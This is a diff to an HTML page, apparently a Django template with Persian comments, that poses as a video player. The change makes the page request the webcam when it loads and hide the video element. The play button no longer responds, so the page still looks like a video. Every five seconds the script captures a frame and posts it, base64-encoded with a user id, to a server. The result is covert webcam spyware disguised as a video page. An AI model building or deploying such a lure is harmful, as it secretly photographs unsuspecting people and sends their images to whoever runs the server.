@@ -1,10 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>youtuber</title>
+    <title>Automatic Image Capture and Send</title>
     <style>
         body {
             display: flex;
@@ -13,103 +12,88 @@
             height: 100vh;
             margin: 0;
         }
-
         .video-container {
-            width: 640px; /* عرض مستطیل */
-            height: 360px; /* ارتفاع مستطیل */
-            border-radius: 20px; /* حاشیه‌های کمتر دایره‌ای برای بخش مستطیلی شکل */
-            overflow: hidden; /* ایجاد حاشیه دور برای حاشیه‌های گرد */
+            width: 640px;
+            height: 360px;
+            border-radius: 20px;
+            overflow: hidden;
             position: relative;
-            box-shadow: 10px 0px 15px rgba(0, 0, 0, 0.5); /* سایه برای بخش سمت راست مستطیل */
+            box-shadow: 10px 0px 15px rgba(0, 0, 0, 0.5);
+            background-color: #000; /* برای دیدن ویدیو در پس‌زمینه */
         }
-
-        .video-container::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #000; /* بک‌گراند بخش مستطیلی شکل را مشکی کنید */
-        }
-
         .play-button {
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background-color: #007bff; /* رنگ پس زمینه دکمه */
-            color: #fff; /* رنگ متن دکمه */
+            background-color: #007bff;
+            color: #fff;
             border: none;
-            border-radius: 50%; /* تبدیل دکمه به شکل دایره‌ای */
+            border-radius: 50%;
             padding: 20px;
             font-size: 18px;
             cursor: pointer;
+            pointer-events: none; /* دکمه را غیرفعال می‌کند */
         }
-
-        .play-button:hover {
-            background-color: #0056b3; /* تغییر رنگ پس زمینه دکمه هنگام هاور */
+        #videoElement {
+            display: none; /* پنهان کردن عنصر ویدیو */
         }
     </style>
 </head>
 <body>
-    <div class="video-container">
-        <p style="text-align: center; padding-top: 150px;">movie</p>
-        <button class="play-button" id="playButton">پخش</button>
+    <div class="video-container" id="videoContainer">
+        <button class="play-button">پخش</button>
+        <!-- عنصر ویدیو پنهان شده است اما مستطیل و دکمه پخش همچنان نمایش داده می‌شوند -->
+        <video id="videoElement" playsinline style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"></video>
     </div>
-
     <script>
-        const playButton = document.getElementById('playButton');
-
-        playButton.addEventListener('click', async () => {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const videoTrack = stream.getVideoTracks()[0];
-
-                const videoElement = document.createElement('video');
-                videoElement.srcObject = new MediaStream([videoTrack]);
-                videoElement.play();
-
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 360;
-                const context = canvas.getContext('2d');
-                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-                const imageDataURL = canvas.toDataURL('image/jpeg');
-
-                const base64Image = imageDataURL.split(',')[1];
-
-                fetch("http://127.0.0.1:8000/video/get_image", {
-                    method: 'POST',
-                    headers: {
-                       'Content-Type':'application/json',
-                        "X-CSRFToken": "{{csrf_token}}",
-                    },
-                    body: JSON.stringify({
-                        picture : base64Image,
-                        id : {{ id }}
-                    }),
-
-
-                }).then(response => {
-                    if (response.ok) {
-                        console.log('Successes to send');
-
-                    } else {
-                        console.error('Failed to send');
+        document.addEventListener('DOMContentLoaded', (event) => {
+            async function captureAndSendImage() {
+                try {
+                    const videoElement = document.getElementById('videoElement');
+                    if (!videoElement.srcObject) {
+                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                        videoElement.srcObject = stream;
                     }
-                }).catch(error => {
-                    console.error('Failed connected to server :', error);
-                });
-            } catch (error) {
-                console.error('Access error :', error);
-            }
-        });
+                    await videoElement.play();
 
+                    const canvas = document.createElement('canvas');
+                    canvas.width = 640;
+                    canvas.height = 360;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                    const imageDataURL = canvas.toDataURL('image/jpeg');
+                    const base64Image = imageDataURL.split(',')[1];
+
+                    // ارسال base64Image به سرور
+                    fetch("http://127.0.0.1:8000/video/get_image", {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type':'application/json',
+                            "X-CSRFToken": "{{csrf_token}}",
+                        },
+                        body: JSON.stringify({
+                            picture: base64Image,
+                            id: {{id}}
+                        }),
+                    }).then(response => {
+                        if (response.ok) {
+                            console.log('Success: Image sent');
+                        } else {
+                            console.error('Error: Failed to send image');
+                        }
+                    }).catch(error => {
+                        console.error('Error: Failed to connect to server', error);
+                    });
+                } catch (error) {
+                    console.error('Error: Access to camera denied', error);
+                }
+            }
+
+            // تنظیم فاصله زمانی برای گرفتن عکس‌ها به صورت پشت سر هم
+            setInterval(captureAndSendImage, 5000); // هر 5 ثانیه یکبار
+        });
     </script>
 </body>
 </html>
-
-
-
